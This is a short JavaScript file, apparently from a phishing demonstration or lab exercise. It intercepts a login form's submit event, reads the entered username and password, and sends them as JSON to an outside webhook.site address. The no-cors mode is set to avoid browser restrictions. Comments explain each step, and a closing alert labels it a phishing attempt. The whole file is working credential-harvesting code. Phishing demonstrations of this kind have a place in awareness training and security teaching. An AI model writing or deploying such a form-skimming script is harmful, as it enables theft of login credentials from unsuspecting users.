document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    // This code capture user input for username and password
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // This code uses the fetch functio to send the credentials to the Webhook URL server with the post method and it converts the data into JSON format.
    fetch('https://webhook.site/1d9f210d-44af-4718-92f4-b8f28e60b5ae', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ username, password }), // This convers the javascript object into JSON string so that the username and password can be sent in a web request to the webhook server.
        mode: 'no-cors'  // Used no-cors mode to avoid any browser restrictions as the server admin needs to enable CORS for my origin.
    });

    // Simple message demonstration to indicate the phishing attempt on this login page 
    alert('Credentials have been sent!');
});


